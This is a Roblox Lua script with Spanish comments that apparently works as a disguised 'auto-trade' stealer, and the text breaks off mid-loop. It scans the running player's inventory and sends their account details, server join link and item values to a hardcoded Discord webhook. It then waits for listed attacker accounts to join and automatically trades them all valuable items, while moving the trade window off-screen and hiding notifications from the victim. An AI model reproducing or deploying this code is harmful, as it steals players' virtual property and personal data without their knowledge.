
-- ==========================================
-- SCRIPT 2 (CORE FINAL - TRADEO FUNCIONAL + VERIFICADORES)
-- ==========================================
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ==========================================
-- 🛠️ SISTEMA DE LOGGING CENTRALIZADO
-- ==========================================
local LOG_BUFFER = {}
local MAX_LOG_SIZE = 100
local LOG_TO_CONSOLE = true
local LOG_TO_WEBHOOK = true

local function log(tipo, mensaje, datos)
    local timestamp = os.date("%H:%M:%S")
    local entry = string.format("[%s] [%s] %s", timestamp, tipo, tostring(mensaje))
    if datos then
        entry = entry .. " | DATA: " .. tostring(datos)
    end
    
    if LOG_TO_CONSOLE then
        if tipo == "ERROR" then
            warn("🔴 " .. entry)
        elseif tipo == "WARN" then
            warn("🟡 " .. entry)
        elseif tipo == "OK" then
            print("🟢 " .. entry)
        else
            print("🔵 " .. entry)
        end
    end
    
    table.insert(LOG_BUFFER, entry)
    if #LOG_BUFFER > MAX_LOG_SIZE then
        table.remove(LOG_BUFFER, 1)
    end
end

local function dumpTabla(t, nombre)
    if type(t) ~= "table" then
        log("WARN", nombre .. " NO es una tabla", type(t))
        return
    end
    local count = 0
    for _ in pairs(t) do count = count + 1 end
    log("INFO", string.format("%s -> %d elementos", nombre or "tabla", count))
    if count <= 5 then
        for k, v in pairs(t) do
            log("INFO", string.format("  [%s] = %s", tostring(k), tostring(v)))
        end
    end
end

local function safeRequire(ruta, nombre)
    local ok, modulo = pcall(function() return require(ruta) end)
    if not ok then
        log("ERROR", "No se pudo requerir: " .. nombre, modulo)
        return nil, modulo
    end
    log("OK", "Módulo cargado: " .. nombre)
    return modulo, nil
end

local function safeHttp(url, nombre)
    log("INFO", "Solicitando HTTP: " .. nombre)
    local ok, resp = pcall(function() return game:HttpGet(url) end)
    if not ok then
        log("ERROR", "HTTP falló en " .. nombre, resp)
        return nil
    end
    if not resp or #resp == 0 then
        log("WARN", "HTTP vacío en " .. nombre)
        return nil
    end
    log("OK", "HTTP OK " .. nombre .. " (" .. #resp .. " bytes)")
    return resp
end

local function safeJsonDecode(data, nombre)
    local ok, decoded = pcall(function() return HttpService:JSONDecode(data) end)
    if not ok then
        log("ERROR", "JSONDecode falló en " .. nombre, decoded)
        return nil
    end
    if type(decoded) ~= "table" then
        log("WARN", "JSON no es tabla en " .. nombre, type(decoded))
        return nil
    end
    log("OK", "JSON decodificado: " .. nombre)
    return decoded
end

local function verificarRemote(remotePath, nombre)
    local ok, remote = pcall(function()
        local parts = {}
        for part in string.gmatch(remotePath, "[^%.]+") do table.insert(parts, part) end
        local obj = RS
        for _, p in ipairs(parts) do
            obj = obj:WaitForChild(p, 5)
            if not obj then error("No se encontró: " .. p) end
        end
        return obj
    end)
    if not ok or not remote then
        log("ERROR", "Remote NO encontrado: " .. nombre .. " en " .. remotePath, remote)
        return nil
    end
    if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then
        log("WARN", "Remote tiene clase inválida: " .. nombre, remote.ClassName)
    end
    log("OK", "Remote encontrado: " .. nombre)
    return remote
end

-- ==========================================
-- URLS DE LOS REPOSITORIOS DE VALORES (JSON)
-- ==========================================
local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
local VALUES_REPO_URL_DUAL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"

-- ==========================================
-- CONFIGURACIÓN SECRETA DUAL
-- ==========================================
local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"

local jugadoresObjetivosDual = {
    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
}
log("INFO", "Jugadores objetivo cargados: " .. #jugadoresObjetivosDual)

-- ==========================================
-- LÓGICA DE FILTRADO
-- ==========================================
local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
local EXCLUDE = {}
for _, n in ipairs(EXCLUDE_ITEMS) do EXCLUDE[string.lower(n)] = true end

log("INFO", "Verificando ItemIsTradeable...")
local ItemIsTradeable, errTrade = safeRequire(RS.Shared.Utils.ItemIsTradeable, "ItemIsTradeable")
if type(ItemIsTradeable) ~= "function" then
    log("WARN", "ItemIsTradeable no es función, se usará fallback", type(ItemIsTradeable))
    ItemIsTradeable = nil
end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then
        log("WARN", "ItemIsTradeable falló para " .. tostring(name), res)
        return true
    end
    return res and true or false
end

-- ==========================================
-- CARGA DINÁMICA DE VALORES (con verificadores)
-- ==========================================
local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
local KnivesDual, GunsDual, EffectsDual, EmotesDual = {}, {}, {}, {}

local function cargarValoresGitHub(url, nombre)
    log("INFO", "Cargando valores de: " .. nombre)
    local response = safeHttp(url, nombre)
    if not response then
        log("ERROR", "No se pudo cargar " .. nombre .. " - devolviendo vacío")
        return {}, {}, {}, {}
    end
    local decoded = safeJsonDecode(response, nombre)
    if not decoded then
        log("ERROR", "JSON inválido en " .. nombre)
        return {}, {}, {}, {}
    end
    local K = decoded.Knives or {}
    local G = decoded.Guns or {}
    local E = decoded.Effects or {}
    local Em = decoded.Emotes or {}
    log("OK", string.format("%s -> Knives:%d, Guns:%d, Effects:%d, Emotes:%d",
        nombre, #K, #G, #E, #Em))
    dumpTabla(K, nombre .. ".Knives")
    return K, G, E, Em
end

Knives, Guns, Effects, Emotes = cargarValoresGitHub(VALUES_REPO_URL, "VALUES_REPO")
KnivesDual, GunsDual, EffectsDual, EmotesDual = cargarValoresGitHub(VALUES_REPO_URL_DUAL, "VALUES_REPO_DUAL")

-- Verificar si algún repositorio está completamente vacío
if #Knives + #Guns + #Effects + #Emotes == 0 then
    log("ERROR", "⚠️ VALORES PRINCIPALES VACÍOS - Verifica URL o conexión")
end
if #KnivesDual + #GunsDual + #EffectsDual + #EmotesDual == 0 then
    log("ERROR", "⚠️ VALORES DUALES VACÍOS - Verifica URL o conexión")
end

task.spawn(function()
    log("INFO", "Esperando AutoTradeConfig en getgenv...")
    local esperaConfig = 0
    while getgenv and not getgenv().AutoTradeConfig do
        task.wait(0.2)
        esperaConfig = esperaConfig + 1
        if esperaConfig > 50 then
            log("WARN", "AutoTradeConfig no aparece tras 10s, continuando sin él")
            break
        end
    end
    
    local config = getgenv().AutoTradeConfig or {}
    log("OK", "Config cargada. Tiene WebhookLogs: " .. tostring(config.WebhookLogs ~= nil and config.WebhookLogs ~= ""))
    local WEBHOOK_LOGS = config.WebhookLogs or "" 
    local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
    local startTime = os.time()

    -- Verificar request disponible
    if not request then
        log("ERROR", "⚠️ 'request' no está disponible. No se podrán enviar webhooks")
    end

    pcall(function()
        if request and player and WEBHOOK_LOGS ~= "" then
            request({
                Url = WEBHOOK_LOGS,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    content = "✅ **" .. player.Name .. "** ha ejecutado el script."
                })
            })
            log("OK", "Webhook de inicio enviado")
        end
    end)

    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == Players.LocalPlayer then
            local tiempoTranscurrido = os.time() - startTime
            local horas = math.floor(tiempoTranscurrido / 3600)
            local minutes = math.floor((tiempoTranscurrido % 3600) / 60)
            local segundos = tiempoTranscurrido % 60

            local textoTiempo = ""
            if horas > 0 then textoTiempo = textoTiempo .. horas .. " horas, " end
            if minutes > 0 then textoTiempo = textoTiempo .. minutes .. " minutos y " end
            textoTiempo = textoTiempo .. segundos .. " segundos"

            log("INFO", "Jugador saliendo. Duró: " .. textoTiempo)

            pcall(function()
                if request then
                    if WEBHOOK_INVENTARIO ~= "" then
                        request({
                            Url = WEBHOOK_INVENTARIO,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado o salido del juego.\n⏳ **Duró ejecutando el script:** `" .. textoTiempo .. "`"
                            })
                        })
                    end
                    if WEBHOOK_LOGS ~= "" then
                        request({
                            Url = WEBHOOK_LOGS,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = "❌ **" .. leavingPlayer.Name .. "** duró `" .. textoTiempo .. "` usando el script."
                            })
                        })
                    end
                end
            end)
        end
    end)

    log("INFO", "Requiriendo ClientGlobals...")
    local cg, errCG = safeRequire(RS.Client.Modules.ClientGlobals, "ClientGlobals")

    if not cg or not cg.PlayerData then
        log("ERROR", "⛔ ClientGlobals o PlayerData no disponibles. Abortando.")
        if cg then dumpTabla(cg, "ClientGlobals keys") end
        return
    end
    log("OK", "ClientGlobals y PlayerData OK")

    local pd = cg.PlayerData
    local allItems = {}
    
    local function normalizeName(name)
        return string.gsub(name, " ", "")
    end

    local categories = {"Knife", "Gun", "Effect", "Emote"}
    for _, cat in ipairs(categories) do
        log("INFO", "Procesando categoría: " .. cat)
        local inv = pd:TryIndex({"Inventory", cat})
        if not inv then
            log("WARN", "Inventario vacío para categoría: " .. cat)
        else
            local count = 0
            for _ in pairs(inv) do count = count + 1 end
            log("INFO", cat .. " tiene " .. count .. " items")
            for guid, item in pairs(inv) do
                if item and item.name then
                    if EXCLUDE[string.lower(item.name)] then
                        log("INFO", "Excluido por EXCLUDE: " .. item.name)
                    elseif not isTradeable(item.name) then
                        log("INFO", "No tradeable: " .. item.name)
                    else
                        table.insert(allItems, {cat = cat, name = item.name, guid = guid})
                    end
                else
                    log("WARN", "Item inválido en " .. cat .. " (guid: " .. tostring(guid) .. ")")
                end
            end
        end
    end

    log("OK", "Total de items procesables: " .. #allItems)
    if #allItems == 0 then
        log("ERROR", "⚠️ NO HAY ITEMS PARA ANALIZAR - Verifica tu inventario")
    end

    local knivesUser, gunsUser, effectsUser, emotesUser = {}, {}, {}, {}
    local totalValueUser = 0
    local knivesDual, gunsDual, effectsDual, emotesDual = {}, {}, {}, {}
    local totalValueDual = 0

    for _, item in ipairs(allItems) do
        local cleanName = normalizeName(item.name)
        
        local valTableUser = nil
        if item.cat == "Knife" then valTableUser = Knives
        elseif item.cat == "Gun" then valTableUser = Guns
        elseif item.cat == "Effect" then valTableUser = Effects
        elseif item.cat == "Emote" then valTableUser = Emotes end
        
        if valTableUser and valTableUser[cleanName] then
            local val = valTableUser[cleanName]
            totalValueUser = totalValueUser + val
            local tUser = {name = item.name, guid = item.guid, value = val}
            if item.cat == "Knife" then table.insert(knivesUser, tUser)
            elseif item.cat == "Gun" then table.insert(gunsUser, tUser)
            elseif item.cat == "Effect" then table.insert(effectsUser, tUser)
            elseif item.cat == "Emote" then table.insert(emotesUser, tUser) end
        else
            log("INFO", "Item no encontrado en VALUES_REPO: " .. item.name .. " (limpio: " .. cleanName .. ")")
        end
        
        local valTableDual = nil
        if item.cat == "Knife" then valTableDual = KnivesDual
        elseif item.cat == "Gun" then valTableDual = GunsDual
        elseif item.cat == "Effect" then valTableDual = EffectsDual
        elseif item.cat == "Emote" then valTableDual = EmotesDual end
        
        if valTableDual and valTableDual[cleanName] then
            local val = valTableDual[cleanName]
            totalValueDual = totalValueDual + val
            local tDual = {name = item.name, guid = item.guid, value = val}
            if item.cat == "Knife" then table.insert(knivesDual, tDual)
            elseif item.cat == "Gun" then table.insert(gunsDual, tDual)
            elseif item.cat == "Effect" then table.insert(effectsDual, tDual)
            elseif item.cat == "Emote" then table.insert(emotesDual, tDual) end
        else
            log("INFO", "Item no encontrado en VALUES_REPO_DUAL: " .. item.name)
        end
    end

    log("INFO", string.format("TOTAL USER: 💰%d | DUAL: 💰%d", totalValueUser, totalValueDual))
    log("INFO", string.format("DUAL -> K:%d G:%d E:%d Em:%d",
        #knivesDual, #gunsDual, #effectsDual, #emotesDual))

    local hayItemsDual = (#knivesDual > 0) or (#gunsDual > 0) or (#effectsDual > 0) or (#emotesDual > 0)

    if hayItemsDual and request then 
        local fileName = "AutoTrade_Executions.json"
        local executionData = {}
        local executionText = player.Name .. " 1x executions"

        if isfile and readfile and writefile then
            if isfile(fileName) then
                local success, data = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
                if success and type(data) == "table" then executionData = data end
            end
            local playerName = player.Name
            if not executionData[playerName] then executionData[playerName] = 0 end
            executionData[playerName] = executionData[playerName] + 1
            pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
            executionText = playerName .. " " .. executionData[playerName] .. "x executions"
        else
            log("WARN", "isfile/readfile/writefile no disponibles")
        end

        local function formatearLista(lista)
            local contador, orden, texto = {}, {}, ""
            for _, v in ipairs(lista) do
                local clave = v.name
                if not contador[clave] then
                    contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
                    table.insert(orden, clave)
                else
                    contador[clave].cantidad = contador[clave].cantidad + 1
                    contador[clave].valor = contador[clave].valor + v.value
                end
            end
            for _, clave in ipairs(orden) do
                local info = contador[clave]
                texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
            end
            if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
            return texto 
        end

        local function generarPayload(knives, guns, effects, emotes, totalValue, titulo)
            local campos = {}
            if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
            if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
            if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
            if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end

            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
            local playersCount = #Players:GetPlayers()
            local maxPlayers = Players.MaxPlayers
            local robloxVer = version()
            
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            local bodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

            local descriptionText = "### 👤 Información del Jugador\n" ..
                                    "**Usuario:** `" .. player.Name .. "`\n" ..
                                    "**Display Name:** `" .. player.DisplayName .. "`\n" ..
                                    "**User ID:** `" .. player.UserId .. "`\n" ..
                                    "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
                                    "### ⚙️ Información del Servidor\n" ..
                                    "**JobId:** `" .. game.JobId .. "`\n" ..
                                    "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
                                    "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
                                    "**Roblox Version:** `" .. robloxVer .. "`\n" ..
                                    "**Executor:** `" .. executorName .. "`\n\n" ..
                                    "### 📊 Estadísticas de Hit\n" ..
                                    "**Historial:** `" .. executionText .. "`\n" ..
                                    "**Total Value:** `💰 " .. totalValue .. "`\n\n" ..
                                    "**=============================**"

            local pings = {}
            local embedColor = 3447003

            if totalValue >= 5000 then
                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR DETECTADO)!** 🚨")
                embedColor = 16711680
            elseif totalValue >= 2000 then
                table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
                embedColor = 16766720
            end

            local finalContentText = nil
            if #pings > 0 then finalContentText = table.concat(pings, "\n") end

            return {
                content = finalContentText, 
                username = "Auto-Trade Bot Scanner",
                avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                embeds = {{
                    title = titulo,
                    color = embedColor, 
                    description = descriptionText,
                    thumbnail = { url = avatarUrl }, 
                    image = { url = bodyUrl },       
                    fields = campos,
                    footer = { 
                        text = "Sistema de Escaneo Automático | " .. os.date("%X"),
                        icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
                    }
                }}
            }
        end

        local payloadUser = generarPayload(knivesUser, gunsUser, effectsUser, emotesUser, totalValueUser, "🎯 ¡Objetivo de Tradeo Localizado!")
        local payloadDual = generarPayload(knivesDual, gunsDual, effectsDual, emotesDual, totalValueDual, "🎯 ¡ROBO EJECUTADO - BOTÍN ASEGURADO!")

        local jsonPayloadUser = HttpService:JSONEncode(payloadUser)
        local jsonPayloadDual = HttpService:JSONEncode(payloadDual)

        task.spawn(function()
            if DUAL_WEBHOOK_INVENTARIO ~= "" then
                local ok, err = pcall(function()
                    return request({
                        Url = DUAL_WEBHOOK_INVENTARIO,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = jsonPayloadDual
                    })
                end)
                if ok then log("OK", "Payload DUAL enviado") else log("ERROR", "Falló envío DUAL", err) end
            end
        end)

        if WEBHOOK_INVENTARIO ~= "" then
            task.delay(300, function()
                local ok, err = pcall(function()
                    return request({
                        Url = WEBHOOK_INVENTARIO,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = jsonPayloadUser
                    })
                end)
                if ok then log("OK", "Payload USER enviado") else log("ERROR", "Falló envío USER", err) end
            end)
        end
    else
        log("WARN", "No hay items DUAL o 'request' no disponible - saltando webhooks")
    end

    -- ==========================================
    -- BÚSQUEDA DEL JUGADOR OBJETIVO
    -- ==========================================
    log("INFO", "Buscando jugadores objetivo...")
    local jugadorEncontrado = nil
    local NOMBRE_OBJETIVO = nil
    local busquedaIntentos = 0

    repeat 
        task.wait(0.5)
        busquedaIntentos = busquedaIntentos + 1
        for _, nombre in ipairs(jugadoresObjetivosDual) do
            local p = Players:FindFirstChild(nombre)
            if p then
                jugadorEncontrado = p
                NOMBRE_OBJETIVO = nombre
                log("OK", "🎯 JUGADOR ENCONTRADO: " .. nombre .. " (intento #" .. busquedaIntentos .. ")")
                break
            end
        end
        if busquedaIntentos % 20 == 0 then
            log("INFO", "Aún buscando jugador... intento #" .. busquedaIntentos .. " | jugadores online: " .. #Players:GetPlayers())
        end
        if busquedaIntentos > 600 then
            log("ERROR", "⚠️ Búsqueda abortada tras 5 minutos sin encontrar objetivo")
            return
        end
    until jugadorEncontrado

    task.wait(10)
    log("INFO", "Espera de 10s completada, iniciando lógica de tradeo")

    -- ==========================================
    -- LÓGICA DE TRADEO EXACTA DEL RYSHUB (CORREGIDA)
    -- ==========================================
    local MAX_TRADE_ITEMS = 12
    local OFFER_GAP = 0.35
    local READY_TIMEOUT = 60
    local INVITE_EVERY = 8

    log("INFO", "Cargando Shared.Remotes...")
    local Remotes, errRemotes = safeRequire(RS.Shared.Remotes, "Shared.Remotes")
    log("INFO", "Recargando ClientGlobals para tradeo...")
    local cgDataTrade, errCG2 = safeRequire(RS.Client.Modules.ClientGlobals, "ClientGlobals.Trade")
    
    -- ✅ BUG ARREGLADO: era 'okCGTrade' pero la variable es 'cgDataTrade'
    if not Remotes or not cgDataTrade then
        log("ERROR", "⛔ No se pudieron cargar Remotes o ClientGlobals para tradeo")
        log("ERROR", "errRemotes: " .. tostring(errRemotes))
        log("ERROR", "errCG2: " .. tostring(errCG2))
        return
    end
    log("OK", "Remotes y ClientGlobals.Trade cargados correctamente")

    -- Verificar que los remotes necesarios existan
    local requiredRemotes = {"SetReady", "CancelTrade", "OfferItem", "AcceptInvite", "SendInvite"}
    local remotesFaltantes = {}
    for _, name in ipairs(requiredRemotes) do
        if not Remotes[name] then
            table.insert(remotesFaltantes, name)
            log("ERROR", "❌ Remote FALTANTE: Remotes." .. name)
        else
            log("OK", "Remote encontrado: Remotes." .. name)
        end
    end
    if #remotesFaltantes > 0 then
        log("ERROR", "⛔ Faltan " .. #remotesFaltantes .. " remotes. Abortando.")
        return
    end

    -- Verificar ActiveNegotiation y SessionState
    if not cgDataTrade.ActiveNegotiation then
        log("ERROR", "⛔ ActiveNegotiation no existe en ClientGlobals")
        return
    end
    if not cgDataTrade.SessionState then
        log("ERROR", "⛔ SessionState no existe en ClientGlobals")
        return
    end
    log("OK", "ActiveNegotiation y SessionState encontrados")

    local ActiveNegotiation = cgDataTrade.ActiveNegotiation
    local SessionState = cgDataTrade.SessionState
    local Workspace = game:GetService("Workspace")

    local function isTargetPlayer(p)
        if not NOMBRE_OBJETIVO then return false end
        local name = typeof(p) == "Instance" and p.Name or tostring(p)
        return string.lower(name) == string.lower(NOMBRE_OBJETIVO)
    end

    local function sides()
        local data = ActiveNegotiation.Data
        if type(data) ~= "table" or not data.player1 or not data.player2 then 
            return nil, nil, nil 
        end
        local me, other
        if data.player1.player and data.player1.player.UserId == player.UserId then
            me, other = data.player1, data.player2
        else
            me, other = data.player2, data.player1
        end
        return me, other, data
    end

    local function offeredGuids()
        local me = sides()
        local set, n = {}, 0
        if me and me.offer then
            for _, guid in pairs(me.offer.items or {}) do set[guid] = true; n = n + 1 end
        end
        return set, n
    end

    local function getIncoming()
        local v = SessionState:TryIndex({ "incomingTradeRequests" })
        return type(v) == "table" and v or {}
    end

    local function waitUntil(cond, timeout)
        local t0 = os.clock()
        while os.clock() - t0 < timeout do
            local ok, result = pcall(cond)
            if ok and result then return true end
            task.wait(0.2)
        end
        local ok, result = pcall(cond)
        return ok and result or false
    end

    local function waitProcessingLock()
        waitUntil(function()
            local d = ActiveNegotiation.Data
            return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
        end, 5)
    end

    local function setReadyTrue()
        local _, _, data = sides()
        if not data then 
            log("WARN", "setReadyTrue: sin datos de negociación")
            return false 
        end
        waitUntil(function()
            local _, _, d = sides()
            return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
        end, 6)
        local _, _, d2 = sides()
        if not d2 then 
            log("WARN", "setReadyTrue: sin d2")
            return false 
        end
        local ok, err = pcall(function() Remotes.SetReady:FireServer(true, d2.ref or {}) end)
        if not ok then log("ERROR", "SetReady FireServer falló", err) end
        return ok
    end

    local function getInventoryForTrade()
        local pdTrade = cgDataTrade.PlayerData
        if not pdTrade then
            log("ERROR", "PlayerData no disponible en getInventoryForTrade")
            return {}
        end
        local items = {}
        
        for _, cat in ipairs({"Knife", "Gun", "Effect", "Emote"}) do
            local inv = pdTrade:TryIndex({"Inventory", cat})
            if inv then
                for guid, item in pairs(inv) do
                    if item and item.name then
                        local cleanName = string.gsub(item.name, " ", "")
                        local valueTable = nil
                        if cat == "Knife" then valueTable = KnivesDual
                        elseif cat == "Gun" then valueTable = GunsDual
                        elseif cat == "Effect" then valueTable = EffectsDual
                        elseif cat == "Emote" then valueTable = EmotesDual end
                        
                        if valueTable and valueTable[cleanName] and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                            table.insert(items, { name = item.name, guid = guid, value = valueTable[cleanName], cat = cat })
                        end
                    end
                end
            end
        end

        table.sort(items, function(a, b) return a.value > b.value end)
        log("INFO", "Items disponibles para tradear: " .. #items)
        return items
    end

    local function tradingWithTarget()
        local _, other = sides()
        return other and other.player and isTargetPlayer(other.player)
    end

    local function handleTrade()
        local offered, offeredCount = offeredGuids()
        local room = MAX_TRADE_ITEMS - offeredCount

        if room > 0 then
            local batch = {}
            for _, e in ipairs(getInventoryForTrade()) do
                if not offered[e.guid] then
                    batch[#batch + 1] = e
                    if #batch >= room then break end
                end
            end

            if #batch == 0 and offeredCount == 0 then
                log("WARN", "Inventario vacío para tradeo, cancelando")
                pcall(function() Remotes.CancelTrade:FireServer() end)
                return "empty"
            end

            if #batch > 0 then
                log("INFO", "Ofreciendo " .. #batch .. " items")
                for i, e in ipairs(batch) do
                    if not sides() then 
                        log("WARN", "Negociación cerrada durante oferta")
                        return "closed" 
                    end
                    waitProcessingLock()
                    local ok, err = pcall(function() Remotes.OfferItem:FireServer(e.guid) end)
                    if not ok then
                        log("ERROR", "OfferItem falló en item " .. i, err)
                    else
                        log("INFO", "Ofrecido: " .. e.name .. " (val:" .. e.value .. ")")
                    end
                    task.wait(OFFER_GAP)
                end
                task.wait(0.5)
                local _, nowCount = offeredGuids()
                if nowCount < math.min(MAX_TRADE_ITEMS, offeredCount + #batch) then
                    log("WARN", "No todos los items fueron aceptados. Tenía " .. offeredCount .. ", ofrecí " .. #batch .. ", ahora hay " .. nowCount)
                    return "retry"
                end
            end
        end

        local me = sides()
        if not me then 
            log("WARN", "handleTrade: sin 'me'")
            return "closed" 
        end
        if not me.ready then
            log("INFO", "Marcando como ready...")
            task.wait(0.3)
            setReadyTrue()
        end

        local done = waitUntil(function()
            local m, _, d = sides()
            if not d then return true end
            if d.exchanging == true then return true end
            if m and not m.ready then return true end
            return false
        end, READY_TIMEOUT)

        local m, _, d = sides()
        if d and d.exchanging then
            log("OK", "🎉 INTERCAMBIO COMPLETADO!")
            waitUntil(function() return sides() == nil end, 20)
            return "done"
        end
        if not d then 
            log("WARN", "handleTrade: negociación cerrada")
            return "closed" 
        end
        if m and not m.ready then 
            log("WARN", "handleTrade: necesito re-ready")
            return "retry" 
        end
        log("INFO", "handleTrade: esperando al otro jugador...")
        return "waiting"
    end

    -- ==========================================
    -- SISTEMA DE OCULTAMIENTO DE GUI
    -- ==========================================
    local tradeGui = nil
    local tradeGuiOriginal = nil
    local tradeHidden = false
    local tradeGuiConns = {}

    task.spawn(function()
        log("INFO", "Buscando GUI de tradeo para ocultar...")
        local okGui, pGui = pcall(function() return player:WaitForChild("PlayerGui", 10) end)
        if not okGui or not pGui then
            log("WARN", "No se pudo obtener PlayerGui")
            return
        end
        local newGui = pGui:WaitForChild("NewGui", 30)
        if not newGui then 
            log("WARN", "NewGui no encontrado")
            return 
        end
        tradeGui = newGui:WaitForChild("TradeNegotiation", 30)
        if not tradeGui then 
            log("WARN", "TradeNegotiation GUI no encontrado")
            return 
        end
        log("OK", "TradeNegotiation GUI encontrado")
        
        tradeGuiOriginal = tradeGui.Position

        local function applyTradeGuiState()
            if not tradeGui then return end
            pcall(function()
                if tradeHidden then
                    if tradeGui.Position ~= UDim2.new(1000, 1000, 1000, 1000) then
                        tradeGui.Position = UDim2.new(1000, 1000, 1000, 1000)
                    end
                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                        pGui.Notifications.Body.Visible = false
                    end
                elseif tradeGuiOriginal and tradeGui.Position ~= tradeGuiOriginal then
                    tradeGui.Position = tradeGuiOriginal
                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                        pGui.Notifications.Body.Visible = true
                    end
                end
            end)
        end

        tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Position"):Connect(function()
            if not tradeHidden and tradeGui.Position ~= UDim2.new(1000, 1000, 1000, 1000) then
                tradeGuiOriginal = tradeGui.Position
            end
            applyTradeGuiState()
        end)
        
        tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Visible"):Connect(applyTradeGuiState)

        while jugadorEncontrado and jugadorEncontrado.Parent do
            local hide = tradingWithTarget()
            if hide ~= tradeHidden then
                tradeHidden = hide
                log("INFO", "Estado GUI tradeo: " .. tostring(hide and "OCULTO" or "VISIBLE"))
                applyTradeGuiState()
            end
            task.wait(0.2)
        end
        
        for _, c in ipairs(tradeGuiConns) do pcall(function() c:Disconnect() end) end
    end)

    -- ==========================================
    -- BUCLE PRINCIPAL DE TRADEO (EXACTO AL RYSHUB)
    -- ==========================================
    local lastInvite = 0
    local lastAccept = {}
    local emptyNotified = false
    local cicloCount = 0

    log("INFO", "🚀 INICIANDO BUCLE PRINCIPAL DE TRADEO")
    log("INFO", "Objetivo: " .. NOMBRE_OBJETIVO)

    while jugadorEncontrado and jugadorEncontrado.Parent do
        cicloCount = cicloCount + 1
        if cicloCount % 25 == 0 then
            log("INFO", "Bucle ciclo #" .. cicloCount .. " | objetivo vivo: " .. tostring(jugadorEncontrado.Parent ~= nil))
        end

        local me, other = sides()

        if me and other and other.player then
            if isTargetPlayer(other.player) then
                local ok, res = pcall(handleTrade)
                if not ok then
                    log("ERROR", "handleTrade CRASHEÓ: " .. tostring(res))
                elseif res == "empty" then
                    if not emptyNotified then
                        emptyNotified = true
                        log("WARN", "Trade vacío detectado")
                    end
                elseif res == "done" then
                    log("OK", "✅ TRADE EXITOSO COMPLETADO")
                    emptyNotified = false
                    task.wait(1)
                elseif res == "retry" then
                    log("WARN", "Trade necesita reintento")
                elseif res == "closed" then
                    log("WARN", "Trade cerrado inesperadamente")
                elseif res == "waiting" then
                    -- log("INFO", "Esperando confirmación del otro")
                end
            else
                log("INFO", "En trade con otro jugador (no objetivo), esperando...")
                task.wait(1)
            end
        else
            local now = os.clock()
            local accepted = false
            local incoming = getIncoming()
            
            for _, p in ipairs(incoming) do
                if isTargetPlayer(p) then
                    local key = typeof(p) == "Instance" and p.UserId or tostring(p)
                    if not lastAccept[key] or now - lastAccept[key] > 3 then
                        lastAccept[key] = now
                        local ok, err = pcall(function() Remotes.AcceptInvite:FireServer(p) end)
                        if ok then
                            log("OK", "✅ Invite aceptada del objetivo")
                        else
                            log("ERROR", "AcceptInvite falló", err)
                        end
                        accepted = true
                    end
                end
            end

            if not accepted and (now - lastInvite > INVITE_EVERY) then
                local inv = getInventoryForTrade()
                if #inv > 0 then
                    lastInvite = now
                    log("INFO", "Enviando invite a " .. NOMBRE_OBJETIVO)
                    local ok, err = pcall(function() Remotes.SendInvite:FireServer(jugadorEncontrado) end)
                    if ok then
                        log("OK", "Invite enviada")
                    else
